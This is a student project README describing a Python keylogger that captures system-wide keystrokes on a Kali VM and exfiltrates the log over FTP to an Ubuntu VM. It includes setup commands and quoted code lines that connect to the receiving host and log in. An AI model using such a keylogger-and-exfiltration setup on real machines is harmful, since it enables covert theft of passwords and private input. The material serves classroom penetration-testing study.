# IT359_GroupProject_Fall2025
Demo Video Link: https://youtu.be/XNx03tu2RUQ 


OVERVIEW

The Keylogger Project is a small attack simulation tool that shows how an attacker can capture and steal user input from a compromised machine. It uses a Python script that records system-wide keystrokes, writes them into a readable text file, and exfiltrates that file to an Ubuntu VM over FTP. This tool was created for our final project, where the goal was to build a working penetration testing tool and walk through the entire process from setup to demonstration.

PURPOSE

The purpose of this tool is to help explain how attackers collect sensitive information without a user noticing anything. We wanted to keep the design simple so the behavior of the keylogger is easy to understand. By building each part ourselves, we gained hands-on experience with how basic keyloggers work and insight into how a small script like this can cause great damage.

REQUIRED DEPENDENCIES AND LIBRARIES

- Kali Linux VM (for running the keylogger)
- Ubuntu Server VM (for receiving exfiltrated logs through FTP)
- Python 3.10+
- vsftpd installed on Ubuntu
- pynput installed on Kali

SETUP INSTRUCTIONS

1 Update Ubuntu and install vsftpd on Ubuntu
- sudo apt update
- sudo apt install vsftpd -y
  
2 Configure and restart vsftpd
- sudo nano /etc/vsftpd.conf
- Configure the following options:
  - local_enable=YES
  - write_enable=YES
  - chroot_local_user=NO
  - anonymous_enable=NO
- sudo systemctl restart vsftpd

3 Update Kali and install pynput
- sudo apt update
- sudo apt install python3-pynput

4 Clone this repository on Kali
- cd ~
- git clone https://github.com/StephanoValdivia/IT359_GroupProject_Fall2025.git
- cd IT359_GroupProject_Fall2025/src

5 Create an empty text file that will serve as the log file
- touch keylogs.txt

6 Configure the IP address and the user for the FTP exfiltration
- sudo nano keylogger.py
- Look for the exfiltrate_file function
- Replace the IP address with you own Ubuntu IP address on this line of code: ftp = ftp = FTP("10.0.0.58")
- Replace the username and password with your own credentials on this linde of code: ftp.login("vmuser", "ab12cd34")

7 Start the keylogger script
- sudo python3 keylogger.py

8 Open a new terminal, browser window, etc. and start typing

9 Press the esc key to stop the keylogger

10 Navigate to the home directory on Ubuntu and view the contents of the log file
- cd ~
- cat keylogs.txt


